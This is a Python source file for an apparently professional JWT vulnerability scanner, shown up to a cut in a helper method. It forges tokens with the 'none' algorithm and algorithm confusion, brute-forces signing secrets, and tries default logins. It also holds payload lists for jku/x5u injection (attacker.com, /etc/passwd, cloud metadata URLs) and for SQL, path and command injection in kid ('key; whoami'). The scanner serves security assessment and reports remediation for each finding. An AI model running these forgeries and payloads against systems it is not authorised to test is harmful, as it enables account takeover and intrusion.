"""
JWT Security Testing Scanner - COMPLETE PROFESSIONAL VERSION
Tests for ALL common JWT vulnerabilities with advanced exploitation techniques
"""

import jwt
import json
import base64
import hashlib
import asyncio
import re
import time
from typing import List, Optional, Dict, Any, Tuple, Set
from datetime import datetime, timedelta
from pathlib import Path
import logging

try:
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    logging.warning("cryptography library not available - RSA tests will be limited")

from app.models.scan import Vulnerability, SeverityLevel, VulnerabilityCategory
from app.http.client import PentestHTTPClient

logger = logging.getLogger(__name__)


class JWTSecurityScanner:
    """
    COMPLETE Professional JWT Security Scanner

    Tests for:
    - Algorithm confusion (none, HS256↔RS256, ES256, PS256)
    - Weak secret brute-force (built-in + external wordlist)
    - JKU/X5U header injection
    - Kid manipulation (SQLi, path traversal, command injection)
    - Claims manipulation (role, admin, user_id, etc.)
    - Token expiration issues
    - Token in URL/cookies discovery
    - Refresh token vulnerabilities
    - Token reuse/replay attacks
    - Signature bypass techniques
    """

    # Comprehensive weak secrets list (production-ready)
    WEAK_SECRETS = [
        # Common defaults
        "secret", "Secret", "SECRET", "SECRET_KEY",
        "jwt_secret", "JWT_SECRET", "jwt-secret",
        "key", "KEY", "api_key", "API_KEY",

        # Common passwords
        "password", "Password", "PASSWORD", "p@ssw0rd",
        "admin", "Admin", "ADMIN", "root", "Root",
        "12345", "123456", "1234567", "12345678",
        "password123", "admin123", "root123",
        "qwerty", "qwerty123", "abc123",

        # Framework defaults
        "your-256-bit-secret", "your-secret-key",
        "changeme", "change-me", "change_me",
        "mysecret", "my-secret", "my_secret",
        "default", "default-secret", "default_key",

        # Test/Demo
        "test", "Test", "TEST", "testing",
        "demo", "Demo", "DEMO", "dev", "development",
        "localhost", "example", "sample",

        # Company/Product names (examples)
        "company", "product", "application", "app",
        "nodejs", "express", "django", "flask", "rails",

        # Empty/Simple
        "", " ", "null", "undefined",
        "1", "a", "xxx", "zzz",

        # Base64 of simple words
        "c2VjcmV0",  # secret
        "YWRtaW4=",  # admin
        "cGFzc3dvcmQ=",  # password
    ]

    # All supported JWT algorithms
    ALL_ALGORITHMS = [
        'HS256', 'HS384', 'HS512',  # HMAC
        'RS256', 'RS384', 'RS512',  # RSA
        'ES256', 'ES384', 'ES512',  # ECDSA
        'PS256', 'PS384', 'PS512',  # RSA-PSS
        'none'  # No signature
    ]

    # JKU/X5U test payloads
    JKU_PAYLOADS = [
        "http://attacker.com/jwks.json",
        "http://127.0.0.1:8000/jwks.json",
        "http://localhost/jwks.json",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "http://metadata.google.internal/",
        "http://169.254.169.254/latest/meta-data/",
    ]

    # Kid injection payloads
    KID_SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin' OR '1'='1",
        "' UNION SELECT 'secret'--",
    ]

    KID_PATH_TRAVERSAL = [
        "../../../dev/null",
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "/dev/null",
        "/proc/self/environ",
    ]

    KID_COMMAND_INJECTION = [
        "key; whoami",
        "key| whoami",
        "key`whoami`",
        "key$(whoami)",
    ]

    def __init__(self, client: PentestHTTPClient, scan_depth: str = "balanced",
                 progress_callback=None, wordlist_path: Optional[str] = None):
        self.client = client
        self.scan_depth = scan_depth
        self.progress_callback = progress_callback
        self.wordlist_path = wordlist_path
        self.discovered_jwts: Dict[str, List[str]] = {}  # endpoint -> [tokens]
        self.cracked_secrets: Dict[str, str] = {}  # token -> secret
        self.tested_tokens: Set[str] = set()

        # Configure based on scan depth
        if scan_depth == "quick":
            self.max_secrets_to_test = 10
            self.test_algorithm_confusion = True
            self.test_weak_secrets = True
            self.test_header_injection = False
            self.test_kid_manipulation = False
            self.test_claims_manipulation = False
            self.test_refresh_tokens = False
            self.use_external_wordlist = False
            self.max_wordlist_lines = 0

        elif scan_depth == "balanced":
            self.max_secrets_to_test = 50
            self.test_algorithm_confusion = True
            self.test_weak_secrets = True
            self.test_header_injection = True
            self.test_kid_manipulation = True
            self.test_claims_manipulation = True
            self.test_refresh_tokens = True
            self.use_external_wordlist = True
            self.max_wordlist_lines = 1000

        else:  # deep
            self.max_secrets_to_test = len(self.WEAK_SECRETS)
            self.test_algorithm_confusion = True
            self.test_weak_secrets = True
            self.test_header_injection = True
            self.test_kid_manipulation = True
            self.test_claims_manipulation = True
            self.test_refresh_tokens = True
            self.use_external_wordlist = True
            self.max_wordlist_lines = 10000

    async def scan(self, endpoints: List[str]) -> List[Vulnerability]:
        """Main scan entry point - comprehensive JWT security testing"""
        vulnerabilities = []

        if self.progress_callback:
            await self.progress_callback(f"🔐 Starting COMPLETE JWT Security Testing on {len(endpoints)} endpoints...")
            await self.progress_callback(f"   Scan depth: {self.scan_depth.upper()} - Testing {self.max_secrets_to_test} secrets")

        # Phase 1: JWT Token Discovery
        await self.progress_callback("📡 Phase 1: JWT Token Discovery...")
        await self._discover_all_jwt_tokens(endpoints)

        if not self.discovered_jwts:
            if self.progress_callback:
                await self.progress_callback("ℹ️  No JWT tokens discovered")
            return vulnerabilities

        total_tokens = sum(len(tokens) for tokens in self.discovered_jwts.values())
        if self.progress_callback:
            await self.progress_callback(f"🎯 Discovered {total_tokens} unique JWT tokens across {len(self.discovered_jwts)} endpoints")

        # Phase 2: Comprehensive Testing
        for idx, (endpoint, tokens) in enumerate(self.discovered_jwts.items(), 1):
            if self.progress_callback:
                await self.progress_callback(f"\n🔍 Testing endpoint {idx}/{len(self.discovered_jwts)}: {endpoint[:60]}...")

            for token_idx, token in enumerate(tokens, 1):
                # Skip if already tested
                if token in self.tested_tokens:
                    continue
                self.tested_tokens.add(token)

                if self.progress_callback:
                    await self.progress_callback(f"   Token {token_idx}/{len(tokens)}: {token[:30]}...")

                try:
                    # Test 1: Algorithm Confusion
                    if self.test_algorithm_confusion:
                        vulns = await self._test_algorithm_confusion_complete(endpoint, token)
                        vulnerabilities.extend(vulns)

                    # Test 2: Weak Secrets
                    if self.test_weak_secrets:
                        vulns = await self._test_weak_secrets_complete(endpoint, token)
                        vulnerabilities.extend(vulns)

                    # Test 3: Header Injection (JKU/X5U/X5C)
                    if self.test_header_injection:
                        vulns = await self._test_header_injection(endpoint, token)
                        vulnerabilities.extend(vulns)

                    # Test 4: Kid Manipulation
                    if self.test_kid_manipulation:
                        vulns = await self._test_kid_manipulation(endpoint, token)
                        vulnerabilities.extend(vulns)

                    # Test 5: Claims Manipulation
                    if self.test_claims_manipulation:
                        vulns = await self._test_claims_manipulation(endpoint, token)
                        vulnerabilities.extend(vulns)

                    # Test 6: Expiration Issues
                    vulns = await self._test_expiration_issues(endpoint, token)
                    vulnerabilities.extend(vulns)

                    # Test 7: Refresh Token Vulnerabilities
                    if self.test_refresh_tokens:
                        vulns = await self._test_refresh_token_vulns(endpoint, token)
                        vulnerabilities.extend(vulns)

                    # Test 8: Token Reuse/Replay
                    vulns = await self._test_token_reuse(endpoint, token)
                    vulnerabilities.extend(vulns)

                except Exception as e:
                    logger.error(f"Error testing JWT on {endpoint}: {e}")
                    if self.progress_callback:
                        await self.progress_callback(f"⚠️  Error: {str(e)[:50]}")

        if self.progress_callback:
            await self.progress_callback(f"\n✅ JWT Security Testing Complete: {len(vulnerabilities)} vulnerabilities found")

        return vulnerabilities

    async def _discover_all_jwt_tokens(self, endpoints: List[str]):
        """Phase 1: Comprehensive JWT token discovery"""

        for endpoint in endpoints[:30]:  # Test first 30 endpoints
            tokens = set()

            try:
                # Method 1: GET request - check response body and headers
                response = await self.client.get(endpoint)
                tokens.update(self._extract_jwt_from_response(response))

                # Method 2: Check cookies
                if hasattr(response, 'cookies'):
                    for cookie_value in response.cookies.values():
                        if self._is_jwt_token(cookie_value):
                            tokens.add(cookie_value)

                # Method 3: POST with common login payloads
                if any(kw in endpoint.lower() for kw in ['login', 'auth', 'signin', 'token', 'oauth']):
                    login_payloads = [
                        {"username": "admin", "password": "admin"},
                        {"username": "test", "password": "test"},
                        {"email": "test@test.com", "password": "test123"},
                        {"user": "demo", "pass": "demo"},
                        # OAuth/Token specific
                        {"grant_type": "password", "username": "test", "password": "test"},
                        {"grant_type": "client_credentials", "client_id": "test", "client_secret": "test"},
                    ]

                    for payload in login_payloads:
                        try:
                            response = await self.client.post(endpoint, json=payload)
                            tokens.update(self._extract_jwt_from_response(response))

                            # Also try form-encoded
                            response = await self.client.post(endpoint, data=payload)
                            tokens.update(self._extract_jwt_from_response(response))
                        except:
                            pass

                # Method 4: Check for refresh token endpoints
                if 'token' in endpoint.lower():
                    refresh_endpoints = [
                        endpoint.replace('token', 'refresh'),
                        endpoint + '/refresh',
                        endpoint.replace('login', 'refresh'),
                    ]
                    for ref_endpoint in refresh_endpoints:
                        try:
                            response = await self.client.get(ref_endpoint)
                            tokens.update(self._extract_jwt_from_response(response))
                        except:
                            pass

                if tokens:
                    self.discovered_jwts[endpoint] = list(tokens)
                    logger.info(f"Found {len(tokens)} JWT token(s) in {endpoint}")

            except Exception as e:
                logger.debug(f"Could not test {endpoint} for JWT: {e}")

    def _extract_jwt_from_response(self, response) -> Set[str]:
        """Extract all JWT tokens from HTTP response"""
        tokens = set()

        if not response:
            return tokens

        try:
            # Check response body
            body = ""
            if hasattr(response, 'text'):
                body = response.text
            elif hasattr(response, 'content'):
                body = str(response.content)

            # JWT pattern: eyJ...eyJ...signature
            jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
            matches = re.findall(jwt_pattern, body)

            for match in matches:
                if self._is_jwt_token(match):
                    tokens.add(match)

            # Check Authorization header
            if hasattr(response, 'headers'):
                auth_header = response.headers.get('Authorization', '')
                if 'Bearer ' in auth_header:
                    token = auth_header.replace('Bearer ', '').strip()
                    if self._is_jwt_token(token):
                        tokens.add(token)

                # Check custom headers
                for header_name in ['X-Auth-Token', 'X-JWT-Token', 'X-Access-Token']:
                    if header_name in response.headers:
                        token = response.headers[header_name]
                        if self._is_jwt_token(token):
                            tokens.add(token)

            # Check Set-Cookie headers
            if hasattr(response, 'headers') and 'Set-Cookie' in response.headers:
                cookie_str = response.headers['Set-Cookie']
                jwt_matches = re.findall(jwt_pattern, cookie_str)
                for match in jwt_matches:
                    if self._is_jwt_token(match):
                        tokens.add(match)

        except Exception as e:
            logger.debug(f"Error extracting JWT: {e}")

        return tokens

    def _is_jwt_token(self, token: str) -> bool:
        """Validate if string is a valid JWT structure"""
        if not isinstance(token, str):
            return False

        parts = token.split('.')
        if len(parts) != 3:
            return False

        # Try to decode header
        try:
            header_data = base64.urlsafe_b64decode(parts[0] + '==')
            header = json.loads(header_data)
            return 'typ' in header or 'alg' in header
        except:
            return False

    async def _test_algorithm_confusion_complete(self, endpoint: str, token: str) -> List[Vulnerability]:
        """COMPLETE algorithm confusion testing"""
        vulnerabilities = []

        try:
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            original_alg = header.get('alg', 'unknown')

            # Test 1: 'none' algorithm
            if original_alg.lower() != 'none':
                none_token = self._create_token_with_alg(header, payload, 'none', '')
                if await self._test_token_accepted(endpoint, none_token):
                    vulnerabilities.append(self._create_vuln(
                        vuln_id=f"jwt_alg_none_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                        title="JWT 'none' Algorithm Bypass - CRITICAL",
                        severity=SeverityLevel.CRITICAL,
                        endpoint=endpoint,
                        description="Server accepts JWT tokens with 'alg': 'none', completely bypassing signature verification. Attacker can forge any token.",
                        poc=f"Original algorithm: {original_alg}\nForged token with alg=none accepted: {none_token[:100]}...",
                        payload=none_token,
                        remediation="1. Reject tokens with 'alg': 'none'\n2. Use algorithm whitelist\n3. Always verify signature\n4. Use library security defaults",
                        cwe="CWE-347",
                        owasp="A07:2021 – Identification and Authentication Failures"
                    ))

            # Test 2: RS256 → HS256 confusion (use public key as HMAC secret)
            if original_alg in ['RS256', 'RS384', 'RS512'] and CRYPTO_AVAILABLE:
                # Try to extract public key from token or endpoint
                public_key = await self._try_extract_public_key(endpoint, token)

                if public_key:
                    # Create HS256 token signed with public key
                    confused_token = self._create_token_with_alg(header, payload, 'HS256', public_key)
                    if await self._test_token_accepted(endpoint, confused_token):
                        vulnerabilities.append(self._create_vuln(
                            vuln_id=f"jwt_alg_confusion_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                            title="JWT RS256→HS256 Algorithm Confusion - CRITICAL",
                            severity=SeverityLevel.CRITICAL,
                            endpoint=endpoint,
                            description=f"Server vulnerable to algorithm confusion. Token expecting RS256 can be bypassed using HS256 with public key as secret. Original alg: {original_alg}",
                            poc="Successfully created HS256 token using RSA public key as HMAC secret. Server accepted it.",
                            payload=confused_token[:100] + "...",
                            remediation="1. Never allow algorithm switching\n2. Use strict algorithm checking\n3. Don't trust 'alg' header value\n4. Separate keys for different algorithms",
                            cwe="CWE-327",
                            owasp="A02:2021 – Cryptographic Failures"
                        ))

            # Test 3: Algorithm switching (try all algorithms)
            for test_alg in ['HS256', 'HS384', 'HS512', 'RS256']:
                if test_alg != original_alg:
                    try:
                        # Try with empty/weak secret
                        switched_token = self._create_token_with_alg(header, payload, test_alg, 'secret')
                        if await self._test_token_accepted(endpoint, switched_token):
                            vulnerabilities.append(self._create_vuln(
                                vuln_id=f"jwt_alg_switch_{test_alg}_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                                title=f"JWT Algorithm Switching: {original_alg}→{test_alg}",
                                severity=SeverityLevel.HIGH,
                                endpoint=endpoint,
                                description=f"Server accepts algorithm switching from {original_alg} to {test_alg} with weak secret 'secret'",
                                poc=f"Original: {original_alg}, Switched to: {test_alg}, Secret: 'secret'",
                                payload=switched_token[:100] + "...",
                                remediation="Use algorithm whitelist and strict verification",
                                cwe="CWE-347"
                            ))
                            break
                    except:
                        pass

        except Exception as e:
            logger.debug(f"Algorithm confusion test error: {e}")

        return vulnerabilities

    async def _test_weak_secrets_complete(self, endpoint: str, token: str) -> List[Vulnerability]:
        """COMPLETE weak secret testing with wordlist support"""
        vulnerabilities = []

        try:
            original_header = jwt.get_unverified_header(token)
            alg = original_header.get('alg', 'HS256')

            # Only test HMAC algorithms
            if alg not in ['HS256', 'HS384', 'HS512']:
                return vulnerabilities

            secrets_to_test = []

            # Built-in secrets
            secrets_to_test.extend(self.WEAK_SECRETS[:self.max_secrets_to_test])

            # External wordlist
            if self.use_external_wordlist and self.wordlist_path:
                wordlist_secrets = await self._load_wordlist(self.wordlist_path, self.max_wordlist_lines)
                secrets_to_test.extend(wordlist_secrets)

            if self.progress_callback:
                await self.progress_callback(f"   🔑 Testing {len(secrets_to_test)} secrets...")

            # Try to crack
            for idx, secret in enumerate(secrets_to_test):
                try:
                    # Attempt to verify with this secret
                    jwt.decode(token, secret, algorithms=[alg])

                    # SUCCESS! We cracked it
                    self.cracked_secrets[token] = secret

                    vulnerabilities.append(self._create_vuln(
                        vuln_id=f"jwt_weak_secret_{hashlib.md5((endpoint + secret).encode()).hexdigest()[:8]}",
                        title=f"JWT Signed with Weak Secret: '{secret}' - CRITICAL",
                        severity=SeverityLevel.CRITICAL,
                        endpoint=endpoint,
                        description=f"JWT is signed with easily guessable secret '{secret}'. Attacker can forge any token with arbitrary claims.",
                        poc=f"Algorithm: {alg}\nSecret cracked: '{secret}'\nTested {idx+1} secrets before finding it.\n\nForged token example:\n{self._create_forged_token_example(token, secret, alg)}",
                        payload=f"Secret: {secret}",
                        remediation="1. Use cryptographically random secret (32+ bytes)\n2. Use environment variables/key management\n3. Rotate keys regularly\n4. Use RS256 instead of HS256 for better security",
                        cwe="CWE-798",
                        owasp="A07:2021 – Identification and Authentication Failures"
                    ))

                    if self.progress_callback:
                        await self.progress_callback(f"   ✅ CRACKED! Secret: '{secret}' (after {idx+1} attempts)")

                    break  # Found it!

                except jwt.InvalidSignatureError:
                    continue
                except Exception:
                    continue

        except Exception as e:
            logger.debug(f"Weak secret test error: {e}")

        return vulnerabilities

    async def _load_wordlist(self, path: str, max_lines: int) -> List[str]:
        """Load wordlist from file"""
        secrets = []
        try:
            wordlist_file = Path(path)
            if wordlist_file.exists():
                with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                    for i, line in enumerate(f):
                        if i >= max_lines:
                            break
                        secret = line.strip()
                        if secret:
                            secrets.append(secret)
                logger.info(f"Loaded {len(secrets)} secrets from wordlist")
        except Exception as e:
            logger.warning(f"Could not load wordlist: {e}")

        return secrets

    def _create_forged_token_example(self, original_token: str, secret: str, alg: str) -> str:
        """Create example of forged admin token"""
        try:
            payload = jwt.decode(original_token, options={"verify_signature": False})
            payload['role'] = 'admin'
            payload['is_admin'] = True
            payload['user_id'] = 1
            forged = jwt.encode(payload, secret, algorithm=alg)
            return forged[:100] + "..."
        except:
            return "[Example token generation failed]"

    async def _test_header_injection(self, endpoint: str, token: str) -> List[Vulnerability]:
        """Test JKU/X5U/X5C header injection"""
        vulnerabilities = []

        try:
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})

            # Test JKU (JSON Key URL)
            for jku_url in self.JKU_PAYLOADS[:5]:
                modified_header = header.copy()
                modified_header['jku'] = jku_url

                malicious_token = self._create_token_with_headers(modified_header, payload, 'secret')
                if await self._test_token_accepted(endpoint, malicious_token):
                    vulnerabilities.append(self._create_vuln(
                        vuln_id=f"jwt_jku_injection_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                        title="JWT JKU Header Injection - CRITICAL",
                        severity=SeverityLevel.CRITICAL,
                        endpoint=endpoint,
                        description=f"Server processes 'jku' (JWK Set URL) header without validation. Attacker can point to malicious key server: {jku_url}",
                        poc=f"Injected jku header: {jku_url}\nServer fetched keys from attacker-controlled URL",
                        payload=malicious_token[:100] + "...",
                        remediation="1. Disable jku/x5u processing\n2. If needed, use strict whitelist of trusted URLs\n3. Validate certificate chains",
                        cwe="CWE-918"
                    ))
                    break

            # Test X5U (X.509 URL)
            for x5u_url in self.JKU_PAYLOADS[:3]:
                modified_header = header.copy()
                modified_header['x5u'] = x5u_url

                malicious_token = self._create_token_with_headers(modified_header, payload, 'secret')
                if await self._test_token_accepted(endpoint, malicious_token):
                    vulnerabilities.append(self._create_vuln(
                        vuln_id=f"jwt_x5u_injection_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                        title="JWT X5U Header Injection",
                        severity=SeverityLevel.HIGH,
                        endpoint=endpoint,
                        description=f"Server processes 'x5u' header pointing to: {x5u_url}",
                        poc=f"Injected x5u header: {x5u_url}",
                        payload=malicious_token[:100] + "...",
                        remediation="Disable x5u processing or use strict whitelist",
                        cwe="CWE-918"
                    ))
                    break

        except Exception as e:
            logger.debug(f"Header injection test error: {e}")

        return vulnerabilities

    async def _test_kid_manipulation(self, endpoint: str, token: str) -> List[Vulnerability]:
        """Test Kid (Key ID) manipulation - SQLi, Path Traversal, Command Injection"""
        vulnerabilities = []

        try:
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})

            # Test 1: SQL Injection in kid
            for sqli_payload in self.KID_SQLI_PAYLOADS:
                modified_header = header.copy()
                modified_header['kid'] = sqli_payload

                malicious_token = self._create_token_with_headers(modified_header, payload, 'secret')
                response_time_start = time.time()
                accepted = await self._test_token_accepted(endpoint, malicious_token)
                response_time = time.time() - response_time_start

                # Check for SQL injection indicators
                if accepted or response_time > 3:  # Timing-based detection
                    vulnerabilities.append(self._create_vuln(
                        vuln_id=f"jwt_kid_sqli_{hashlib.md5((endpoint + sqli_payload).encode()).hexdigest()[:8]}",
                        title="JWT Kid SQL Injection - CRITICAL",
                        severity=SeverityLevel.CRITICAL,
                        endpoint=endpoint,
                        description=f"The 'kid' header parameter is vulnerable to SQL injection. Payload: {sqli_payload}",
                        poc=f"Kid value: {sqli_payload}\n{'Token accepted!' if accepted else 'Timing anomaly detected: ' + str(response_time) + 's'}",
                        payload=malicious_token[:100] + "...",
                        remediation="1. Use parameterized queries for kid lookup\n2. Validate kid against whitelist\n3. Use prepared statements",
                        cwe="CWE-89"
                    ))
                    break

            # Test 2: Path Traversal in kid
            for path_payload in self.KID_PATH_TRAVERSAL:
                modified_header = header.copy()
                modified_header['kid'] = path_payload

                # Special case: /dev/null with empty secret
                if path_payload == '/dev/null':
                    malicious_token = self._create_token_with_headers(modified_header, payload, '')
                else:
                    malicious_token = self._create_token_with_headers(modified_header, payload, 'secret')

                if await self._test_token_accepted(endpoint, malicious_token):
                    vulnerabilities.append(self._create_vuln(
                        vuln_id=f"jwt_kid_path_traversal_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                        title="JWT Kid Path Traversal - HIGH",
                        severity=SeverityLevel.HIGH,
                        endpoint=endpoint,
                        description=f"The 'kid' header allows path traversal. Server loaded key from: {path_payload}",
                        poc=f"Kid value: {path_payload}\nServer processed path traversal payload",
                        payload=malicious_token[:100] + "...",
                        remediation="1. Validate kid format\n2. Use whitelist of allowed key IDs\n3. Don't use kid for file paths",
                        cwe="CWE-22"
                    ))
                    break

            # Test 3: Command Injection in kid
            for cmd_payload in self.KID_COMMAND_INJECTION:
                modified_header = header.copy()
                modified_header['kid'] = cmd_payload

                malicious_token = self._create_token_with_headers(modified_header, payload, 'secret')
                response_time_start = time.time()
                accepted = await self._test_token_accepted(endpoint, malicious_token)
                response_time = time.time() - response_time_start

                if response_time > 3:  # Command execution delay
                    vulnerabilities.append(self._create_vuln(
                        vuln_id=f"jwt_kid_cmdi_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                        title="JWT Kid Command Injection - CRITICAL",
                        severity=SeverityLevel.CRITICAL,
                        endpoint=endpoint,
                        description=f"The 'kid' header may be vulnerable to command injection. Payload: {cmd_payload}",
                        poc=f"Kid value: {cmd_payload}\nTiming anomaly: {response_time}s (indicates possible command execution)",
                        payload=malicious_token[:100] + "...",
                        remediation="1. Never execute kid value\n2. Use strict validation\n3. Whitelist approach only",
                        cwe="CWE-78"
                    ))
                    break

        except Exception as e:
            logger.debug(f"Kid manipulation test error: {e}")

        return vulnerabilities

    async def _test_claims_manipulation(self, endpoint: str, token: str) -> List[Vulnerability]:
        """Test claims manipulation for privilege escalation"""
        vulnerabilities = []

        try:
            payload = jwt.decode(token, options={"verify_signature": False})

            # Interesting claims to manipulate
            claims_tests = [
                ('role', ['admin', 'administrator', 'root', 'superuser']),
                ('user_role', ['admin', 'administrator']),
                ('admin', [True, 'true', '1', 1]),
                ('isAdmin', [True, 'true', '1', 1]),
                ('is_admin', [True, 'true', '1', 1]),
                ('superuser', [True, 'true', '1', 1]),
                ('userId', [1, '1', 0, '0']),  # Admin user IDs
                ('user_id', [1, '1', 0, '0']),
                ('sub', ['1', 'admin', 'root']),
                ('email', ['admin@admin.com', 'root@localhost']),
                ('privileges', ['admin', 'all', '*']),
                ('scope', ['admin', 'write', 'all']),
            ]

            for claim_name, test_values in claims_tests:
                if claim_name in payload:
                    original_value = payload[claim_name]

                    for test_value in test_values:
                        modified_payload = payload.copy()
                        modified_payload[claim_name] = test_value

                        # Create token without signature (alg: none)
                        manipulated_token = self._create_unsigned_token(modified_payload)

                        if await self._test_token_accepted(endpoint, manipulated_token):
                            vulnerabilities.append(self._create_vuln(
                                vuln_id=f"jwt_claims_manip_{claim_name}_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                                title=f"JWT Claims Manipulation: {claim_name} - CRITICAL",
                                severity=SeverityLevel.CRITICAL,
                                endpoint=endpoint,
                                description=f"Server accepts modified '{claim_name}' claim without signature verification. Privilege escalation possible.",
                                poc=f"Original {claim_name}: {original_value}\nModified to: {test_value}\nServer accepted unsigned token (alg: none)",
                                payload=manipulated_token[:100] + "...",
                                remediation="1. ALWAYS verify signature before trusting claims\n2. Implement server-side authorization checks\n3. Don't rely solely on JWT claims for access control",
                                cwe="CWE-639",
                                owasp="A01:2021 – Broken Access Control"
                            ))
                            break  # Found vuln for this claim

        except Exception as e:
            logger.debug(f"Claims manipulation test error: {e}")

        return vulnerabilities

    async def _test_expiration_issues(self, endpoint: str, token: str) -> List[Vulnerability]:
        """Test token expiration issues"""
        vulnerabilities = []

        try:
            payload = jwt.decode(token, options={"verify_signature": False})

            # Test 1: Missing expiration
            if 'exp' not in payload:
                vulnerabilities.append(self._create_vuln(
                    vuln_id=f"jwt_no_exp_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                    title="JWT Without Expiration Claim",
                    severity=SeverityLevel.HIGH,
                    endpoint=endpoint,
                    description="JWT does not contain 'exp' claim. Token never expires, increasing risk if leaked.",
                    poc=f"Token payload:\n{json.dumps(payload, indent=2)}\n\nNo 'exp' claim found.",
                    payload=token[:100] + "...",
                    remediation="Add 'exp' claim with reasonable expiration (15min for access tokens, 7 days for refresh tokens)",
                    cwe="CWE-613"
                ))
            else:
                # Test 2: Excessive expiration
                exp_timestamp = payload['exp']
                current_time = datetime.utcnow().timestamp()
                time_until_exp = exp_timestamp - current_time
                days_until_exp = time_until_exp / (24 * 3600)

                if days_until_exp > 365:  # More than 1 year
                    vulnerabilities.append(self._create_vuln(
                        vuln_id=f"jwt_long_exp_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                        title="JWT with Excessive Expiration Time",
                        severity=SeverityLevel.MEDIUM,
                        endpoint=endpoint,
                        description=f"JWT expires in {days_until_exp:.1f} days (more than 1 year). Excessive expiration increases security risk.",
                        poc=f"Expiration: {days_until_exp:.1f} days\nRecommended: 15-60 min for access tokens",
                        payload=f"exp: {exp_timestamp}",
                        remediation="Use short-lived access tokens (15-60 min) with refresh token rotation",
                        cwe="CWE-613"
                    ))

            # Test 3: Token reuse after logout (if we can detect logout endpoint)
            # This would require session tracking, implemented in _test_token_reuse

        except Exception as e:
            logger.debug(f"Expiration test error: {e}")

        return vulnerabilities

    async def _test_refresh_token_vulns(self, endpoint: str, token: str) -> List[Vulnerability]:
        """Test refresh token vulnerabilities"""
        vulnerabilities = []

        try:
            # Try to identify if this is a refresh token
            payload = jwt.decode(token, options={"verify_signature": False})

            is_refresh = False
            if 'type' in payload and 'refresh' in str(payload['type']).lower():
                is_refresh = True
            elif 'token_type' in payload and 'refresh' in str(payload['token_type']).lower():
                is_refresh = True

            if is_refresh:
                # Test 1: Refresh token reuse
                # Try to use the same refresh token multiple times
                refresh_endpoint = endpoint.replace('login', 'refresh').replace('token', 'refresh')

                try:
                    # First use
                    response1 = await self.client.post(refresh_endpoint,
                                                      headers={'Authorization': f'Bearer {token}'})
                    # Second use (should fail if rotation is implemented)
                    response2 = await self.client.post(refresh_endpoint,
                                                      headers={'Authorization': f'Bearer {token}'})

                    if hasattr(response2, 'status_code') and response2.status_code == 200:
                        vulnerabilities.append(self._create_vuln(
                            vuln_id=f"jwt_refresh_reuse_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                            title="Refresh Token Reuse Allowed - HIGH",
                            severity=SeverityLevel.HIGH,
                            endpoint=refresh_endpoint,
                            description="Refresh token can be reused multiple times. No rotation implemented. Stolen refresh tokens remain valid.",
                            poc="Same refresh token successfully used twice. Token rotation not implemented.",
                            payload=token[:100] + "...",
                            remediation="Implement refresh token rotation: invalidate old token after each use",
                            cwe="CWE-613"
                        ))
                except:
                    pass

                # Test 2: Excessive refresh token expiration
                if 'exp' in payload:
                    exp_timestamp = payload['exp']
                    current_time = datetime.utcnow().timestamp()
                    days_until_exp = (exp_timestamp - current_time) / (24 * 3600)

                    if days_until_exp > 90:  # More than 3 months
                        vulnerabilities.append(self._create_vuln(
                            vuln_id=f"jwt_refresh_long_exp_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                            title="Refresh Token Long Expiration",
                            severity=SeverityLevel.MEDIUM,
                            endpoint=endpoint,
                            description=f"Refresh token expires in {days_until_exp:.1f} days. Recommended maximum: 30-90 days.",
                            poc=f"Refresh token expiration: {days_until_exp:.1f} days",
                            payload=f"exp: {exp_timestamp}",
                            remediation="Limit refresh token lifetime to 7-30 days with rotation",
                            cwe="CWE-613"
                        ))

        except Exception as e:
            logger.debug(f"Refresh token test error: {e}")

        return vulnerabilities

    async def _test_token_reuse(self, endpoint: str, token: str) -> List[Vulnerability]:
        """Test if token can be reused after logout"""
        vulnerabilities = []

        try:
            # Test if token is still valid after simulated logout
            logout_endpoints = [
                endpoint.replace('login', 'logout'),
                endpoint.replace('auth', 'logout'),
                endpoint + '/logout',
                '/api/logout',
                '/logout',
            ]

            for logout_ep in logout_endpoints:
                try:
                    # Try to logout with this token
                    await self.client.post(logout_ep, headers={'Authorization': f'Bearer {token}'})

                    # Try to use token again
                    if await self._test_token_accepted(endpoint, token):
                        vulnerabilities.append(self._create_vuln(
                            vuln_id=f"jwt_token_reuse_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                            title="JWT Token Reuse After Logout - HIGH",
                            severity=SeverityLevel.HIGH,
                            endpoint=endpoint,
                            description=f"JWT token remains valid after logout. Token should be invalidated on logout endpoint: {logout_ep}",
                            poc="Token used successfully after logout request",
                            payload=token[:100] + "...",
                            remediation="1. Implement token blacklist/revocation\n2. Use short-lived tokens\n3. Maintain server-side session state for logout",
                            cwe="CWE-613"
                        ))
                        break
                except:
                    pass

        except Exception as e:
            logger.debug(f"Token reuse test error: {e}")

        return vulnerabilities

    # ========== HELPER METHODS ==========

    async def _try_extract_public_key(self, endpoint: str, token: str) -> Optional[str]:
        """Try to extract RSA public key for algorithm confusion"""
        if not CRYPTO_AVAILABLE:
            return None

        try:
            # Try common JWKS endpoints
            jwks_endpoints = [
                '/.well-known/jwks.json',
                '/jwks.json',
